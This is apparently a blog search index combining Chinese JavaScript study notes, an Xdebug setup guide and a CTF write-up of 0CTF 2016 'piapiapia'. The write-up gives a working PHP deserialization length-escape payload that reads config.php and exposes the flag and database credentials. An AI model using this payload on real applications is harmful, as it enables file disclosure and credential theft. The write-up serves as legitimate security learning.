让其中一个引用变量指向另一个对象, 另一个引用变量依然指向前一个对象\n\n// 2个引用变量指向同一个对象var a = &#123;age: 12&#125;;var b = a;// 让其中一个引用变量指向另一个对象a = &#123;name: 'BoB', age: 13&#125;;b.age = 14;// 另一个引用变量依然指向前一个对象console.log(b.age, a.name, a.age); //12 'BoB' 13\n\n\n在JS调用函数时传递变量参数时, 是值传递还是引用传递\n理解1: 都是值(基本/地址值)传递\n理解2: 可能是值传递, 也可能是引用传递(地址值)\n\n\n\nvar a = 3;// 实参a 传递 给形参a 肯定是值传递   形参a 是局部变量 值改变不会影响外部的变量afunction fn (a) &#123;    a = a + 1;&#125;fn(a);console.log(a);\n\n\nJS引擎如何管理内存?\n内存生命周期\n分配小内存空间, 得到它的使用权\n存储数据, 可以反复进行操作\n释放小内存空间\n\n\n释放内存\n局部变量: 函数执行完自动释放\n对象: 成为垃圾对象 -&gt; 垃圾回收器回收\n\n\n\n\n\n对象\n什么是对象?\n\n多个数据的封装体\n用来保存多个数据的容器\n一个对象代表现实中的一个事物\n\n\n为什么要用对象?\n\n统一管理多个数据\n\n\n对象的组成\n\n属性\n属性名(字符串)和属性值(任意)组成\n\n\n方法\n一种特别的属性(属性值是函数)\n\n\n\n\n如何访问对象内部数据?\n\n.属性名\n编码简单,有时不能用\n\n\n[]\n编码麻烦,能通用\n\n\n\n\n什么时候必须使用[&#39;属性名&#39;]的方式?\n\n属性名包含特殊字符: -  空格\n变量名不确定\n\n\n\n\n函数了解函数\n什么是函数?\n实现特定功能的n条语句的封装体\n只有函数是可以执行的, 其他类型的数据不能执行\n\n\n为什么要用函数?\n提高代码复用\n便于封装\n函数的核心思想\n封装\n\n\n\n\n如何定义函数?\n函数声明\n表达式\n\n\n如何调用(执行)函数?\ntest() : 直接调用\nobj.test() : 通过对象调用\nnew.test() : new调用\ntest.call/apply(obj) : 临时让test成为obj的方法进行调用\n\n\n\n回调函数\n什么函数才是回调函数?\n你定义的\n你没有掉，但最终它执行了\n\n\n常见的回调函数?\ndom事件回调函数\n定时器回调函数\najax请求回调函数\n生命周期回调函数\n\n\n\n&lt;button id='btn'&gt;测试点击事件&lt;/button&gt;\n\n// dom事件回调函数document.getElementById('btn').onclick = function()&#123;    alert(this.innerHTML);&#125;// 定时回调函数setTimeout(function()&#123;    alert(\"我是定时器回调函数\");&#125;, 2000);\n\nIIFE(立即调用函数表达式)\n理解\n全称: Immediately-Invoked Function Expression\n中文解释: 立即调用的函数表达式\n\n\n作用\n隐藏实现\n不会污染外部(全局)命名空间\n用它来编写js模块\n\n\n\n// 匿名函数自调用// 这样写不会污染(全局)命名空间function()&#123;    var a = 3;    console.log(a + 3);&#125;()// 与匿名函数中的a 不是同一个avar a = 4;console.log(a);;function()&#123;    var a = 1;    function test()&#123;        console.log(++a);    &#125;    // 这样写是向外暴露一个全局函数    window.$ = function()&#123;        return &#123;            test: test        &#125;    &#125;&#125;()$().test();\n\n函数中的this\nthis是什么?\n\n任何函数本质上都是通过某个对象来调用的, 如果没有直接指定的就是window\n所有函数内部都有一个变量this\n它的值是调用函数的当前对象\n自己的理解\nthis其实就是函数的调用者, 可能是window,可能是某个对象\n\n\n\n\n如何确定this的值?\n\ntest() : window\np.test() : p\nnew test() : 新创建的对象\np.call(obj) : obj\n\n\n\n总结\n数据类型：两大类基本类型(值): String  Number Boolean undefined null对象类型(引用): Object Function(可以执行)  Array(有序)判断数据类型的方法(3种)typeof(返回数据类型名, 不能区别null、对象和数组)instanceof(返回true/false, 专门用来判断Object、Array、Function)===(返回true/false, 只能判断undefined和null)\n\n\n数据是存储在内存中代表特定信息的东西内存是通电后临时产生可存储数据的空间变量是可变化的量, 变量以及变量的值会以数据的形式保存到内存中\n\n\n对象是多个数据的封装体\n\n\n函数是实现特定功能的n条语句的封装体\n\n\n回调函数是自己定义, 没有调用却执行了的特殊函数\n\n\nIIFE 立即调用函数表达式\n\n\nthis代表函数的调用者\n\n函数高级(重点内容)原型与原型链原型\n函数的prototype属性\n函数都有prototype属性，默认指向一个Object空对象(既称为原型对象),每个原型对象中有一个属性constructor,它指向函数对象\n\n\n给原型对象添加属性(一般是方法)\n作用：函数的所有实例对象自动拥有原型中的属性(方法)\n\n\n\n显式原型与隐式原型\n每个函数function都有一个prototype, 既显式原型(属性)\n每个实例对象都有一个proto, 可称为隐式原型(属性)\n对象的隐式原型的值为其对应构造函数的显式原型的值\n总结函数的prototype属性: 在定义函数时自动添加的,默认值是一个空Object对象对象的__proto__属性: 创建对象时自动添加的, 默认值为构造函数的prototype属性值程序员能直接操作显式原型,但不能直接操作隐式原型(ES6之前)\n\n\n\n\n原型链\n说明\n访问一个对象的属性时，先在自身属性中查找,找到返回,如果没有,则沿着__proto__这条链向上查找,找到返回,如果最终没有找到,返回undefined\n\n\n别名: 隐式原型链\n作用\n查找对象的属性(方法)\n\n\n理解原型链的三个基本点\n函数的显式原型指向的对象默认是空Object实例对象(但Objec不满足)\n所有函数都是Function的实例(包含Function)\nObject的原型对象是原型链的尽头\n\n\n\n\n原型链_属性问题\n读取对象属性值时: 会自动到原型链中查找\n设置对象属性值时: 不会查找原型链, 如果当前对象中没有此属性,直接添加此属性并设置其值\n方法一般定义在原型中, 属性一般通过构造函数定义在对象本身内 \n\ninstanceof\ninstanceof是如何判断的?\n表达式: A instanceof B\n如果B函数的显式原型对象在A对象的原型链上, 返回true, 否则返回false\n\n\nFunction是通过new自己产生的实例\n\n执行上下文与执行上下文栈变量提升与函数提升\n变量声明提升\n通过var定义(声明)的变量, 在定义语句之前就可以访问到\n值为undefined\n\n\n\n\n函数声明提升\n通过function声明的函数, 在之前就可以直接调用\n值为函数定义(对象)\n总结一句话就是变量定义前可以使用变量,但值 为undefined\n\n\n\n\n\n\n\n执行上下文(帮助理解内部是如何执行的)\n代码分类(位置)\n全局代码\n函数(局部)代码\n\n\n全局执行上下文(流程)\n在执行全局代码前将window确定为全局执行上下文\n对全局数据进行预处理\nvar定义的全局变量==&gt;undefined,添加为window的属性\n将var定义的变量作为添加到window中\n\n\nfunction声明的全局函数==&gt;赋值(fun), 添加为window的方法\n将function声明的函数作为方法添加到window中\n\n\nthis==&gt;赋值(window)\n最后才开始执行全局代码\n\n\n\n\n函数执行上下文(流程)\n在调用函数,准备执行函数体之前,创建对应的函数执行上下文对象(虚拟的,存在与栈中)\n对局部数据进行预处理\n形参变量==&gt;赋值(实参)==&gt;添加为执行上下文的属性\narguments==&gt;赋值(实参列表),添加为执行上下文的属性\nvar定义的局部变量==&gt;undefined,添加为执行上下文的方法\nthis==&gt;赋值(调用函数的对象)\n最后才开始执行函数体代码\n\n\n\n\n\n执行上下文栈\n在全局代码执行前,JS引擎就会创建一个栈来存储管理所有的执行上下文对象\n在全局执行上下文(window)确定后,将其添加到栈中(压栈)\n在函数执行上下文创建后,将其添加到栈中(压栈)\n在当前函数执行完后,将栈顶的对象移出(出栈)\n所有的代码执行完后,栈中只剩下window\n\n![](F:\\素材整理\\素材库.library\\images\\KCKGAPGDU5S33.info[译] 理解 JavaScript 中的执行上下文和执行栈 - 掘金_thumbnail.png)\n作用域与作用域链作用域\n什么是作用域?\n就是一块”地盘”,一个代码段所在的区域\n特点：它是静态的(相当于上下文对象),在编写代码时就确定了\n\n\n作用域分类\n全局作用域\n函数作用域\n块作用域(ES6存在)\n\n\n作用域的作用\n隔离变量，不同作用域下同名变量不会有冲突\n\n\n\n作用域与执行上下文\n作用域与执行上下文的区别\n区别一\n全局作用域之外,每个函数都会创建自己的作用域,作用域在函数定义时就已经确定了。而不是在函数调用时\n全局执行上下文环境是在全局作用域确定之后,js代码马上执行之前创建\n函数执行上下文是在调用函数时,函数体代码执行之前创建\n\n\n区别二\n作用域是静态的,只要函数定义好了就一直存在,且不会再变化\n执行上下文是动态的,调用函数时创建,函数调用结束时就会自动释放\n\n\n\n\n作用域与执行上下文的联系\n执行上下文(对象)是从属于所在的作用域\n全局上下文环境==&gt;全局作用域\n函数上下文环境==&gt;对应的函数使用域\n\n\n\n作用域链\n什么是作用域链?\n多个上下级关系的作用域形成的链,它的方向是从下向上的(从内到外)\n查找变量时就是沿着作用域链来查找的\n\n\n查找一个变量的查找规则\n在当前作用域下的执行上下文中查找对应的属性,如果有直接返回,否则进入2\n在上一级作用域的执行上下文中查找对应的属性,如果有直接返回,否则进入3\n再次执行2的相同操作,直到全局作用域,如果还找不到就抛出找不到的异常\n\n\n\n闭包了解闭包\n如何产生闭包?\n当一个嵌套的内部(子)函数引用了嵌套的外部(父)函数的变量(函数)时,就产生了闭包\n\n\n闭包是什么?\n闭包是嵌套的内部函数\n包含被引用变量(函数)的对象\n注意:\n闭包存在于嵌套的内部函数中\n\n\n\n\n产生闭包的条件?\n函数嵌套\n内部函数引用了外部函数的数据(变量/函数)\n\n\n\nfunction fn1() &#123;    var a = 2;    function fn2() &#123;//产生了闭包        a++;        console.log(a);    &#125;    return fn2&#125;var f = fn1();f() // 3f() // 4\n\n闭包的作用\n使用函数内部的变量在函数执行完厚,仍然存活在内存中(延长了局部变量的生命周期)\n让函数外部可以操作(读写)到函数内部的数据(变量/函数)\n\n闭包的生命周期\n产生\n在嵌套内部函数定义执行完时就产生了(不是在调用)\n\n\n死亡\n在嵌套的内部函数成为垃圾对象时\n\n\n\n闭包的应用\n定义JS模块\n具有特定功能的js文件\n将所有的数据和功能都封装在一个函数内部(私有的)\n只向外暴露一个包含n个方法的对象或函数\n模块的使用者,只需要通过模块暴露的对象调用方法来实现对应的功能\n\n\n\n闭包的缺点以及如何解决\n缺点\n函数执行完厚,函数内的局部变量没有释放,占用内存时间会变长\n容易造成内存泄漏\n\n\n解决\n能不用闭包就不用闭包\n及时释放\n变量 = null\n\n\n\n\n\n内存溢出与内存泄露\n内存溢出\n一种程序运行出现的错误\n当程序运行需要的内存超过了剩余的内存时, 就出抛出内存溢出的错误\n\n\n内存泄露\n占用的内存没有及时释放\n内存泄露积累多了就容易导致内存溢出\n常见的内存泄露:\n意外的全局变量\n没有及时清理的计时器或回调函数\n闭包\n\n\n\n\n\n总结\n原型分为显式原型和隐式原型\n每个函数都有一个prototype,也就是显式原型\n每个实例对象都有一个__proto__，也就是隐式原型\n实例对象的隐式原型的值等于构造函数的显式原型的值\n\n\n原型链：通过隐式原型查找属性或方法的一条路径,Object的原型对象是原型链的尽头\n原型链属性问题：读取对象属性或方法时才会查找原型链,设置时则不会\n\n\nA instanceof  B \nB函数的显式原型对象在A对象的原型链上，返回true，否则返回false\n\n\n变量声明提升：通过var声明的变量, 在执行语句前,就会保存到window对象中，只是没有赋值\n函数声明提升：通过function声明的函数,在声明语句前就可以调用\n\n\n执行上下文：当前javascript代码被解析和执行时所在的环境的抽象概念\n特点：动态生成 调用函数时就会自动生成一个执行上下文 结束时会自动销毁\n\n\n作用域：一个代码所在区域\n特点：静态，作用域在编写代码时就确定了\n\n\n闭包：一个函数可以访问另一个函数作用域中的变量，前者是闭包\n作用：让子函数能访问到父函数中的变量\n\n面向对象高级(重点内容)对象的创建模式Object构造函数模式\n创建流程\n\n先创建空的Object对象,再动态添加属性/方法\n\n\n适用场景\n\n起始时不确定对象内部数据\n\n\n存在问题\n\n语句太多\n\n\n实现代码\n// 创建空Object对象var obj = new Object();var obj = &#123;&#125;;// 动态添加属性/方法obj.name = 'Tom';obj.age = 14;obj.setName = function(name)&#123;    this.name = name&#125;\n\n\n\n对象字面量模式\n创建流程\n\n使用{}创建对象,同时指定属性/方法\n\n\n适用场景\n\n起始时对象内部属性是确定的\n\n\n存在问题\n\n如果创建多个对象,代码冗余\n\n\n实现代码\n// &#123;&#125;创建对象, 同时指定属性/方法var obj = &#123;    name: 'Tom',    age: 14,    setName: function(name)&#123;        this.name = name;    &#125;&#125;\n\n\n\n工厂模式\n创建流程\n\n通过工厂函数动态创建对象并返回\n\n\n适用场景\n\n需要创建多个对象\n\n\n存在问题\n\n对象没有具体的类型,都是Object类型\n\n\n实现代码\n// 创建工厂函数function createPerson(name, age)&#123;    var obj = &#123;        name: name,        age: age,        setName: function(name)&#123;            this.name = name        &#125;    &#125;    return obj&#125;\n\n\n\n自定义构造函数模式\n创建流程\n\n自定义构造函数,通过new创建对象\n\n\n适用场景\n\n需要创建多个类型确定的对象\n\n\n存在问题\n\n每个对象都有相同的数据,浪费内存\n\n\n实现代码\n// 创建自定义构造函数function Person(name, age)&#123;    this.name = name;    this.age = age;    this.setName = function(name)&#123;        this.name = name    &#125;&#125;// new创建对象var p1 = new Person('Tom', 12);p1.setName('YF');var p2 = new Person('Bom', 14);p2.setName('YangFan');\n\n\n\n构造函数+原型的组合模式\n创建流程\n\n自定义构造函数,属性在函数中初始化,方法添加到原型中\n\n\n适用场景\n\n需要创建多个类型确定的对象\n\n\n实现代码\n// 自定义构造函数function Person(name, age)&#123;    this.name = name;    this.age = age;&#125;// 方法添加到原型中Person.prototype.setName = function(name)&#123;    this.name = name;&#125;// new 创建对象var p1 = new Person('Tom', 14);p1.setName('YF');var p2 = new Person('Bom', 12);p2.setName('YangFan');\n\n\n\n继承模式原型链继承\n实现流程\n定义父类型构造函数\n给父类型的原型添加方法\n定义子类型的构造函数\n创建父类型的对象赋值给子类型的原型\n将子类型的原型的构造属性设置为子类型\n给子类型原型添加方法\n创建子类型的对象: 可以调用父类型的方法\n\n\n实现继承的关键\n子类型的原型为父类的一个实例对象\n\n\n实现代码// 定义父类型构造函数function Supper()&#123;    this.supPro = \"Supper property\";&#125;// 给父类型的原型添加方法Supper.prototype.showSupPro = function()&#123;    console.log(this.supPro);&#125;// 定义子类型的构造函数function Sub()&#123;    this.subPro = \"Sub property\";&#125;// 创建父类型的对象赋值给子类型的原型Sub.prototype = new Supper();// 将子类型的原型的构造属性设置为子类型Sub.prototype.constructor = Sub;// 给子类型原型添加方法Sub.prototype.showSubPro = function()&#123;    console.log(this.subPro);&#125;// 创建子类型对象var s1 =new Sub();// 调用父类型方法s1.showSupPro();\n\n\n\n借用构造函数继承(不是真正意义上的继承)\n实现流程\n定义父类型构造函数\n定义子类型构造函数\n在子类型中构造函数中调用父类型构造\n\n\n实现继承的关键\n在子类型构造函数中通过call()调用父类型构造函数\n\n\n实现代码// 定义弗雷西构造函数function Person(name, age)&#123;    this.name = name;    this.age = age;&#125;// 定义子类型构造函数function Student(name, age, price)&#123;    // 在子类型中构造函数中调用父类型构造    Person.call(this, name, age);    this.price = price;&#125;var s1 = new Student('Tom', 14, 1000);console.log(s1.name, s1.age, s1.price);\n\n\n\n原型链+借用构造函数的组合继承\n实现关键\n\n利用原型链实现对父类型对象的方法的继承\n利用call()借用父类型构建函数初始化相同属性\n\n\n实现代码\nfunction Person(name, age)&#123;    this.name =name;    this.age = age;&#125;Person.prototype.setName = function(name)&#123;    this.name = name;&#125;function Student(name, age, price)&#123;    Person.call(this, name, age);    this.price = price;&#125;Student.prototype = new Person(); // 这一步是为了让子类型能使用到父类型的方法Student.prototype.constructor = Student; // 这一步是为了修正constructor属性Student.prototype.setPrice = function(price)&#123;    this.price = price;&#125;var s1 =new Student('Tom', 14, 10000);s1.setName('Bom');s1.setPrice(8000);console.log(s1);\n\n\n\n知识点\nnew一个对象背后做了什么?\n创建一个空对象\n给对象设置proto,值为构造函数的prototype属性值 this.proto = Fn.prototype\n执行构造函数体(给对象添加属性/方法)\n\n\n\n线程机制与事件机制线程与进程\n进程\n\n每个程序必须有一个进程,占有一片独立的内存空间\n可以通过windows任务管理查看进程\n\n\n线程\n\n进程内的一个地理执行单元\n执行程序的一个完整流程\nCPU的最小调度单元\n\n\n进程与线程的关系\n\n一个进程至少有一个线程(主)\n程序是在某个进程中的某个线程执行的\n\n\n\n浏览器内核模块组成\n主线程\n\nJS引擎模块\n负责js程序的编译与运行\n\n\nHTML/CSS文档解析模块\n负责页面文本的解析\n\n\nDOM/CSS模块\n负责dom/css在内存中的相关处理\n\n\n布局和渲染模块\n负责页面的布局和效果的绘制(内存中的对象)\n\n\n\n\n分线程\n\n定时器模块\n负责定时器的管理\n\n\nDOM事件模块\n负责事件的管理\n\n\n网络请求模块\n负责Ajax请求\n\n\n\n\n\nJS线程\nJS是单线程执行的(回调函数也是在主线程)\nH5提出了实现多线程的方案: Web Workers\n只能是主线程更新界面\n\n定时器问题\n定时器并不真正完全定时\n如果在主线程执行了一个长时间的操作,可能导致延时才处理\n\n事件处理机制\n代码分类\n\n初始化执行代码\n包含绑定DOM事件监听、设置定时器、发送Ajax请求的代码\n\n\n回调执行代码\n处理回调逻辑\n\n\n\n\nJS引擎执行代码的基本流程\n\n初始化代码 ==&gt; 回调代码\n\n\n模型的两个重要组成部分\n\n事件管理模块\n回调队列\n\n\n模型的运转流程\n\n执行初始化代码,将事件回调函数交给对应模块管理\n当事件发生时,管理模块会将回调函数及其数据添加到回调列队中\n只有当初始化代码执行完后(可能要一定时间),才会遍历读取回调队列中的回调函数执行\n\n\n\nH5 Web Workers\n可以让js在分线程执行\n\nWorker实现代码\nvar woker = new Worker('worker.js');// 用来接收另一个线程发送过来的数据的回调worker.onMessage = function(event)&#123;    event.data;&#125;// 向另一个线程发送数据worker.postMessage(data1);\n\n问题\n\nworker内代码不能操作DOM更新UI\n\n不是每个浏览器都支持这个新特性\n\n不能跨域加载JS\n总结\n一个进程至少有一个线程(主)\n\n\n浏览器内核模块组成\n主线程中有JS引擎模块、HTML/CSS文档解析模块、DOM/CSS模块、布局和渲染模块\n分线程中有定时器模块、DOM事件模块、网络请求模块\n\n\nJS是单线程执行的\n\n\n定时器并不真正完全定时\n\n\n在事件处理机制中代码分为初始化执行代码和回调执行代码\n\n\nWorkers是H5中的分线程执行功能，但是存在一些问题\n\n\n\n\n\n","categories":["Javascript"],"tags":["javascript学习"]},{"title":"PHP环境下开启xdebug调试","url":"/2022/11/16/PHP%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%BC%80%E5%90%AFxdebug%E8%B0%83%E8%AF%95/","content":"第一步：下载xdebug先根据php版本去下载一个对应的php_xdebug.dll\nhttps://xdebug.org/wizard\n\n第二步：在php.ini中配置xdebug在php.ini中添加 \n[Xdebug]zend_extension=E:/Tools/Env/phpstudy_pro/Extensions/php/php5.6.9nts/ext/php_xdebug.dll //dll路径xdebug.collect_params=1xdebug.collect_return=1xdebug.auto_trace=Offxdebug.trace_output_dir=E:/Tools/Env/phpstudy_pro/Extensions/php_log/php5.6.9nts.xdebug.tracexdebug.profiler_enable=Offxdebug.profiler_output_dir=E:/Tools/Env/phpstudy_pro/Extensions/php_log/php5.6.9nts.xdebug.profilerxdebug.remote_enable=Onxdebug.remote_host=localhostxdebug.remote_port=9000xdebug.remote_handler=dbgp\n\n使用phpstudy，可以将前两步代替掉\n\n\n\n\n\n\n\n第三步：在phpstorm配置php和xdebug然后在 phpstorm中，添加一个php的环境和xdebug扩展\n\n\n\n\n\n\n\n在\n\n\n\n\n\n\n\n添加一个PHP Built-in Web Server， 配置好 Server Configuration\n\n\n\n\n\n\n\n运行，然后先访问一下 127.0.0.1:804\n\n\n\n\n\n\n\n然后回到 phpstorm 中验证一下\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n这样表示成功\n第四步：在火狐中安装xdebug扩展，并测试接下来 在浏览器中安装 一个扩展\nhttps://www.jetbrains.com/help/phpstorm/2021.1/browser-debugging-extensions.html\n\n启用\n\n\n\n\n\n\n\n在主页下一个断点，并开启监听\n\n\n\n\n\n\n\n访问一下，成功拦截到\n\n\n\n\n\n\n\n","categories":["代码审计"],"tags":["xdebug"]},{"title":"BUUCTF-WEB 【0CTF 2016】piapiapia 1","url":"/2021/04/10/%5B0CTF%202016%5Dpiapiapia%201/","content":"考点：php反序列化字符长度逃逸打开题目\n一般看到登录框，就以为是sql注入题，这道题不是。\ndirsearch扫网站目录python3 dirsearch.py -u &quot;http://16b5eb0b-ac30-452a-808a-0e9214102abd.node3.buuoj.cn/&quot; -s 1 --exclude-status=429,403 -t 1  _|. _ _  _  _  _ _|_    v0.4.1 (_||| _) (/_(_|| (_| )Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 1 | Wordlist size: 10848Error Log: F:\\Tools\\WEB\\Python-Tools\\dirsearch-master\\logs\\errors-21-04-12_16-36-23.logTarget: http://16b5eb0b-ac30-452a-808a-0e9214102abd.node3.buuoj.cn/Output File: F:\\Tools\\WEB\\Python-Tools\\dirsearch-master\\reports\\16b5eb0b-ac30-452a-808a-0e9214102abd.node3.buuoj.cn\\_21-04-12_16-36-24.txt[16:36:24] Starting:[16:36:28] 200 -  392KB - /www.zip[16:36:33] 200 -  788B  - /php[16:36:38] 200 -  788B  - /js\n\n看了别人wp，这道题存在源码泄露，在网站目录会泄漏一个www.zip文件，用工具扫，还不容易扫出来，我开了代理居然扫不出来。\n下载下来，有这么些文件。\n\n分析关键的三个地方\nupdate.php\nif($_POST['phone'] &amp;&amp; $_POST['email'] &amp;&amp; $_POST['nickname'] &amp;&amp; $_FILES['photo']) &#123;\t$username = $_SESSION['username'];\tif(!preg_match('/^\\d&#123;11&#125;$/', $_POST['phone']))\t\tdie('Invalid phone');\tif(!preg_match('/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/', $_POST['email']))\t\tdie('Invalid email');\t\tif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10)\t\tdie('Invalid nickname');\t$file = $_FILES['photo'];\tif($file['size'] &lt; 5 or $file['size'] &gt; 1000000)\t\tdie('Photo size error');\tmove_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));\t$profile['phone'] = $_POST['phone'];\t$profile['email'] = $_POST['email'];\t$profile['nickname'] = $_POST['nickname'];\t$profile['photo'] = 'upload/' . md5($file['name']);\t# 这里会调用 class.php 的 update_profile 方法\t$user-&gt;update_profile($username, serialize($profile));\techo 'Update Profile Success!&lt;a href=\"profile.php\"&gt;Your Profile&lt;/a&gt;';&#125;\n\nprofile.php\n&lt;?php\trequire_once('class.php');\tif($_SESSION['username'] == null) &#123;\t\tdie('Login First');\t\t&#125;\t$username = $_SESSION['username'];\t# 这里调用的是class.php 的 show_profile方法\t$profile=$user-&gt;show_profile($username);\tif($profile  == null) &#123;\t\theader('Location: update.php');\t&#125;\telse &#123;\t\t$profile = unserialize($profile);\t\t$phone = $profile['phone'];\t\t$email = $profile['email'];\t\t$nickname = $profile['nickname'];\t\t$photo = base64_encode(file_get_contents($profile['photo']));?&gt;\n\nclass.php\npublic function show_profile($username) &#123;\t\t$username = parent::filter($username);\t\t$where = \"username = '$username'\";\t\t$object = parent::select($this-&gt;table, $where);\t\treturn $object-&gt;profile;\t&#125;\t# \tpublic function update_profile($username, $new_profile) &#123;\t\t$username = parent::filter($username);        # 这就是造成序列化漏洞的关键地方\t\t$new_profile = parent::filter($new_profile);\t\t$where = \"username = '$username'\";\t\treturn parent::update($this-&gt;table, 'profile', $new_profile, $where);\t&#125;public function select($table, $where, $ret = '*') &#123;\t\t$sql = \"SELECT $ret FROM $table WHERE $where\";\t\t$result = mysql_query($sql, $this-&gt;link);\t\treturn mysql_fetch_object($result);\t&#125;# 这个方法将 序列化后的内容 进行了替换 将含有'select', 'insert', 'update', 'delete', 'where' 以上关键字 替换成了 hacker 并且还进行了返回public function filter($string) &#123;\t\t$escape = array('\\'', '\\\\\\\\');\t\t$escape = '/' . implode('|', $escape) . '/';\t\t$string = preg_replace($escape, '_', $string);\t\t$safe = array('select', 'insert', 'update', 'delete', 'where');\t\t$safe = '/' . implode('|', $safe) . '/i';\t\treturn preg_replace($safe, 'hacker', $string);\t&#125;\n\n简化来看&lt;?php$profile['phone'] = $_POST['phone'];$profile['email'] = $_POST['email'];$profile['nickname'] = $_POST['nickname'];$profile['photo'] = 'upload/';$str1 = filter(serialize($profile));var_dump($str1);echo \"&lt;br/&gt;\";$str2 = unserialize($str1);echo \"nickname:\".$str2['nickname'];echo \"&lt;br/&gt;\";echo \"photo:\".$str2['photo'];function filter($string) &#123;    $escape = array('\\'', '\\\\\\\\');    $escape = '/' . implode('|', $escape) . '/';    $string = preg_replace($escape, '_', $string);    $safe = array('select', 'insert', 'update', 'delete', 'where');    $safe = '/' . implode('|', $safe) . '/i';    return preg_replace($safe, 'hacker', $string);&#125;?&gt;\n\n按照下列参数进行提交，返回的序列化结果\nphone=11111111111&amp;email=123@qq.com&amp;nickname=fany\n\na:4:&#123;s:5:\"phone\";s:11:\"11111111111\";s:5:\"email\";s:10:\"123@qq.com\";s:8:\"nickname\";s:4:\"fany\";s:5:\"photo\";s:7:\"upload/\";&#125;\n\n\n提交过滤参数，看返回的序列化结果\nphone=11111111111&amp;email=123@qq.com&amp;nickname=wherewherewhere\n\na:4:&#123;s:5:\"phone\";s:11:\"11111111111\";s:5:\"email\";s:10:\"123@qq.com\";s:8:\"nickname\";s:15:\"hackerhackerhacker\";s:5:\"photo\";s:7:\"upload/\";&#125;\n\n\n可以看到出现了报错，原本输入的where序列化后的长度为15，输出显示的时候，经过了filter对其内容进行了过滤，where被替换为hacker，但是序列化后的长度没有变，替换成hacker，由于where比hacker少了一位，所以在读取时，发现读取到15位的时候并没有读取到 ; 所以就照成了报错。\n接下来利用这个漏洞\nphone=11111111111&amp;email=123@qq.com&amp;nickname=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";s:5:\"photo\";s:10:\"config.php\";&#125;\n\na:4:&#123;s:5:\"phone\";s:11:\"11111111111\";s:5:\"email\";s:10:\"123@qq.com\";s:8:\"nickname\";s:198:\"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker\";s:5:\"photo\";s:10:\"config.php\";&#125;\";s:5:\"photo\";s:7:\"upload/\";&#125;\n\n\n直接可以看到photo 变成了config.php。分析一下，&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;} 的字符串长度为33，输入了33个where，总长度为33+33*5=198，在总长度不变的情况下，33个where替换成了33个hacker，\n33*6=198，自然读取到的就是 结束的位置，后面接上的&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;} 就接着读取。因为总属性为4个，也已经读取完毕，后边的;s:5:&quot;photo&quot;;s:7:&quot;upload/&quot;;} 就会被丢去掉。\n回到题目if($_POST['phone'] &amp;&amp; $_POST['email'] &amp;&amp; $_POST['nickname'] &amp;&amp; $_FILES['photo']) &#123;\t\t$username = $_SESSION['username'];\t\tif(!preg_match('/^\\d&#123;11&#125;$/', $_POST['phone']))\t\t\tdie('Invalid phone');\t\tif(!preg_match('/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/', $_POST['email']))\t\t\tdie('Invalid email');\t\t\t\tif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10)\t\t\tdie('Invalid nickname');\t\t$file = $_FILES['photo'];\t\tif($file['size'] &lt; 5 or $file['size'] &gt; 1000000)\t\t\tdie('Photo size error');\t\tmove_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));\t\t$profile['phone'] = $_POST['phone'];\t\t$profile['email'] = $_POST['email'];\t\t$profile['nickname'] = $_POST['nickname'];\t\t$profile['photo'] = 'upload/' . md5($file['name']);\t\t$user-&gt;update_profile($username, serialize($profile));\t\techo 'Update Profile Success!&lt;a href=\"profile.php\"&gt;Your Profile&lt;/a&gt;';\t&#125;\n\nupdate.php 里的 会接收三个参数，$profile[‘phpone’]、$profile[‘email’]、$profile[‘nickname’]。\n在传入$profile[‘ncikname’]会存在一个条件\nif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10)\n\n不是大写字母小写字母数字下划线 或者 字符串长度大于10 就直接报错，停止程序，这里直接就来一手数组绕过。\n进行profile.php页面,提交，抓包。\n\nwherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;\n\n得到\n\nPD9waHAKJGNvbmZpZ1snaG9zdG5hbWUnXSA9ICcxMjcuMC4wLjEnOwokY29uZmlnWyd1c2VybmFtZSddID0gJ3Jvb3QnOwokY29uZmlnWydwYXNzd29yZCddID0gJ3F3ZXJ0eXVpb3AnOwokY29uZmlnWydkYXRhYmFzZSddID0gJ2NoYWxsZW5nZXMnOwokZmxhZyA9ICdmbGFne2U1ZWY1MDE0LWMzZmQtNDIyYS1hNWE4LWYyMDkzMWM0YWNmYX0nOwo/Pgo=\n\nbase64解码\n\n坑点提交的时候 需要将nickname转换为数组进行提交，我提交多次都都还是读取不到，报Warning:  file_get_contents(): Filename cannot be empty in /var/www/html/profile.php on line 16，看了他们的payload后，发现在ncikname处有 } 